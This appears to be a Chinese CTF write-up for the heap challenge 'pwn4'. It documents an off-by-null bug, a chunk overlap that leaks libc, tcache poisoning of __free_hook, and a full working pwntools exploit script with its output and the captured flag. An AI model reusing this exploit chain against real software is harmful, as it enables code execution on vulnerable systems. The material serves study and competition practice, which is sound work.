# pwn4（归档/pwn4）WP

## 1. 题目信息

- 题目：`pwn4`（附件目录 `归档/`）
- 类型：pwn / 堆 off-by-null + chunk overlap 泄漏 + tcache poisoning
- 附件：
  - `归档/pwn4`，sha256 `0f5faa413ac3e41dc433b2f7ff4a2d3885cdcd174fd2c1ecb20cc7deab92d3ca`
    - ELF 64-bit LSB **pie executable**, x86-64, stripped
  - `归档/libc.so.6`，sha256 `80378c2017456829f32645e6a8f33b4c40c8efa87db7e8c931a229afa7bf6712`
    - GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9)
- 保护：**PIE / Full RELRO / Canary / NX**
- 远端：`49.232.142.230:11970`（端口会轮换，以当前为准）
- 本地调试：Ubuntu 22.04 Lima VM + `ld-2.31.so` + 题目自带 `libc.so.6` 运行
- **Flag：`flag{4c0b2fd8a8ef6942d040d31d34aefc84}`**

## 2. 侦察

```
$ file pwn4
ELF 64-bit LSB pie executable, x86-64, ... dynamically linked, stripped

# checksec
PIE: Enabled    Full RELRO    Canary: Found    NX: Enabled

$ strings -n5 pwn4
1. create
2. show
3. delete
>> 
index: 
size: 
content: 
Create Failed!
No data!
Delete Failed!
```

菜单与交互：

```
1. create
2. show
3. delete
>>
```

- `create`：`index` / `size` / `content`（`index ≤ 0x20`，size 用户可控）
- `show`：打印 `content: ` 后 `puts(chunk[index])`
- `delete`：`free(chunk[index])` 且**置空**槽位（无 UAF）

关键反汇编（`create`，0x1345）：

```
13d7: mov [rbp-36], eax          ; size
13e6: call malloc
13ff: mov [chunk+8*idx], rcx     ; chunk[idx] = malloc(size)
143a: call read                  ; read(0, chunk[idx], size)
143f: mov [rbp-36], eax          ; ret = read 的返回
1459: mov rdx, [chunk+8*idx]
1460: add rax, rdx
1463: mov byte ptr [rax], 0      ; <== chunk[idx][ret] = 0   (off-by-null)
```

## 3. 漏洞分析

`create` 在 `read` 之后执行 `chunk[idx][ret] = 0`，其中 `ret` 是 `read` 实际读到的字节数：

- 若送满 `size` 且 `size ≡ 8 (mod 16)`，`ret == size == 可用大小`，这个 `\0` 正好落在**下一个 chunk 的 size 最低字节**；
- 由于写的是整字节：
  - 下一个 chunk 的 size 低字节为 `0x01`（如 `0x501`）→ 只清掉 `prev_inuse`；
  - 低字节非 0（如 `0x521`）→ 会把 size **缩小**到 `0x500`；
- 同时当前 chunk 用户区最后 8 字节即下一个 chunk 的 `prev_size`，可被完全控制。

即典型的 **off-by-null / poison null byte**。注意 `create` 的 `read` 只把**实际发送的字节数**写入并在这之后补 `\0`，所以用「短内容 + 自动补零」可以实现对相邻 chunk 头/残留指针的**1 字节级别局部改写**（本题没有 edit 功能，靠这个技巧代替）。

另外 `create` 允许 `index == 0x20`（数组 `chunk[32]` 越界写到 `.bss` 段尾 0x4160），但那里是零页，无控制价值。

## 4. 利用思路（为什么可行）

程序**没有 UAF、没有泄漏**，且远端开启 ASLR——因此必须先用 off-by-null 自己造出一个 **overlap**，通过它 `show` 出 unsorted bin 的 `fd`（= `main_arena` 附近）拿到 libc，再做 **tcache poisoning** 打 `__free_hook`。

核心中间值：

| 项 | 值 |
| --- | --- |
| unsorted bin `fd` 相对 libc | `main_arena+0x60 = 0x1ecbe0` |
| `__free_hook` | `0x1eee48` |
| `system` | `0x52290` |
| libc base | `leak - 0x1ecbe0` |

利用分两段：

**A. 造 overlap 泄 libc**

- 以 `0x508`（chunk `0x510`）、`0x18`（chunk `0x20`）等尺寸交错分配 8 个 chunk；
- 释放若干个 `0x510`（`0x510 > 0x410` → 进 unsorted），再用 `0x508` 重新申请；
- 用短内容把相邻 chunk 的 size 局部改成 `0x531`，并在 `0x530` chunk 里伪造 `0x521 / 0x511` 等 chunk 头（`b'\0'*0x4f8 + p64(0x521)+p64(0)+p64(0x511)`）；
- 再经过一轮 delete/add + `add(4,0x18, b'\0'*0x10 + p64(0x530))` 把 `prev_size` 设成 `0x530`、最后 `delete(5)` 触发合并，得到**chunk 2 与一个已释放的 unsorted chunk 重叠**；
- `add(11,0x20)` 占位后 `show(2)`，`puts` 打印出重叠区里 unsorted chunk 的 `fd` → libc 泄漏。

**B. tcache poisoning 打 `__free_hook`**

- `add(12,0x18); delete(12); delete(4)` 形成可复用的 tcache 链；
- `add(14,0x28, p64(__free_hook-8))` 把 tcache `fd` 劫持到 `__free_hook-8`；
- `add(15,0x18)` 吃掉链首，`add(16,0x18, b'/bin/sh\0'+p64(system))` 让下一次分配落在 `__free_hook` 并写入 `system`；
- `delete(16)` → `free("/bin/sh")` → `system("/bin/sh")`。

## 5. 攻击链

```
create 交错分配(0x510/0x20…)
      │  delete 多个 0x510 -> unsorted
      ▼
短内容 + 自动补零 局部改写相邻 size / 伪造 chunk 头(0x531/0x521/0x511)
      │
      ▼
delete(5) 触发合并 -> chunk2 与 freed unsorted chunk overlap
      │
      ▼
show(2) -> 读出 unsorted fd = main_arena+0x60 -> libc base
      │
      ▼
tcache poisoning: fd = __free_hook-8
      │
      ▼
分配写入 system @ __free_hook
      │
      ▼
free("/bin/sh") -> system("/bin/sh") -> cat flag
```

## 6. 完整利用脚本

保存于 `exploits/pwn4.py`，运行：

```bash
# 远端（端口可换）
.venv/bin/python exploits/pwn4.py 49.232.142.230 11970
```

```python
#!/usr/bin/env python3
import sys, os
sys.path = [q for q in sys.path if os.path.abspath(q or '.') != os.path.dirname(os.path.abspath(__file__))]
from pwn import *
import re

context.clear(arch='amd64', os='linux', log_level='info')
HOST = sys.argv[1] if len(sys.argv) > 1 else '49.232.142.230'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11970


def add(sh, index, size, content):
    sh.sendlineafter(b'>> ', b'1')
    sh.sendlineafter(b'index: ', str(index).encode())
    sh.sendlineafter(b'size: ', str(size).encode())
    sh.sendafter(b'content: ', content)


def delete(sh, index):
    sh.sendlineafter(b'>> ', b'3')
    sh.sendlineafter(b'index: ', str(index).encode())


def run():
    sh = remote(HOST, PORT, timeout=15)
    try:
        add(sh, 0, 0x508, b'\n')
        add(sh, 1, 0x48, b'\n')
        add(sh, 2, 0x508, b'\n')
        add(sh, 3, 0x508, b'\n')
        add(sh, 4, 0x18, b'\n')
        add(sh, 5, 0x508, b'\n')
        add(sh, 6, 0x508, b'\n')
        add(sh, 7, 0x18, b'\n')
        delete(sh, 0); delete(sh, 3); delete(sh, 6); delete(sh, 2)
        add(sh, 0, 0x508, b'\n')
        add(sh, 2, 0x508, b'\n')
        add(sh, 3, 0x530, b'\0' * 0x508 + p64(0x531)[:6])
        delete(sh, 2); delete(sh, 5)
        add(sh, 2, 0x4d8, b'\n')
        add(sh, 5, 0x530, b'\0' * 0x4f8 + p64(0x521) + p64(0) + p64(0x511))
        add(sh, 6, 0x4d8, b'\n')
        delete(sh, 0); delete(sh, 2)
        add(sh, 0, 0x508, b'\0' * 8)
        add(sh, 2, 0x4d8, b'\n')
        delete(sh, 4)
        add(sh, 4, 0x18, b'\0' * 0x10 + p64(0x530))
        delete(sh, 5)
        add(sh, 11, 0x20, b'\n')
        sh.sendlineafter(b'>> ', b'2')
        sh.sendlineafter(b'index: ', b'2')
        sh.recvuntil(b'content: ')
        leak = u64(sh.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
        libc_addr = leak - 0x1ecbe0
        log.success('leak=%#x libc=%#x' % (leak, libc_addr))
        free_hook = libc_addr + 0x1eee48
        system_addr = libc_addr + 0x52290
        add(sh, 12, 0x18, b'\n')
        delete(sh, 12); delete(sh, 4)
        add(sh, 13, 0x4b0, b'\n')
        add(sh, 14, 0x28, p64(free_hook - 8))
        add(sh, 15, 0x18, b'\n')
        add(sh, 16, 0x18, b'/bin/sh\0' + p64(system_addr))
        delete(sh, 16)
        sh.sendline(b'cat /flag*; cat flag*')
        data = sh.recvrepeat(2)
        m = re.search(rb'[A-Za-z0-9_]+\{[^}]{1,200}\}', data)
        if m:
            print('FLAG:', m.group().decode())
            return True
    except Exception as e:
        log.warning('attempt failed: %s' % e)
    finally:
        try: sh.close()
        except Exception: pass
    return False


for i in range(6):
    log.info('attempt %d' % (i + 1))
    if run():
        break
```

## 7. 实际输出

```
$ .venv/bin/python exploits/pwn4.py 49.232.142.230 11970
[*] attempt 1
[+] Opening connection to 49.232.142.230 on port 11970: Done
[+] leak=0x7fcbe17cfbe0 libc=0x7fcbe15e3000
b'flag{4c0b2fd8a8ef6942d040d31d34aefc84}\nflag{...}\n'
FLAG: flag{4c0b2fd8a8ef6942d040d31d34aefc84}
```

## 8. 踩坑 / 死路

- **无泄漏、无 UAF、无 edit**：`show` 到 `\0` 停止、`delete` 置空槽 → 只能靠 off-by-null 自造 overlap 才能泄漏。
- **null 落点细节**：清的是**整字节**不是单个 bit。size 低字节为 `0x01` 时只清 `prev_inuse`；为非 0（如 `0x21`）会**缩小 size**（`0x521→0x500`）。利用时要按需选择尺寸。
- **没有 edit 也能局部改写**：`create` 的 `read` 只写实际发送字节数并在其后补 `\0`，所以「短内容 + `\0`」= 1 字节局部改写（甚至可用 `b'\n'` 只写 1 字节）。
- **`show` 会先打印 `content: `**，解析泄漏时要先 `recvuntil(b'content: ')` 再取泄漏行。
- **PIE/Full RELRO**：GOT 不可写，最终目标是 `__free_hook`（2.31 仍有 hook）。
- **远端开 ASLR**，所以必须先泄漏 libc；libc 已随附件给出且与远端一致（`system/free_hook/main_arena` 偏移全对上）。
- 端口会轮换；libc 泄漏行若包含 `\n` 字节会导致解析失败，脚本带重试。

## 9. 验证

- Flag 连续两次独立连接均为 `flag{4c0b2fd8a8ef6942d040d31d34aefc84}`，格式为 `flag{32 位 hex}`。
- libc 偏移核对：附件 libc `system=0x52290`、`__free_hook=0x1eee48`，与泄漏基准 `0x1ecbe0`（`main_arena+0x60`）一致。
- 本地用题目自带 `libc.so.6`（2.31-0ubuntu9.9）+ `ld-2.31.so` 可复现同一布局。
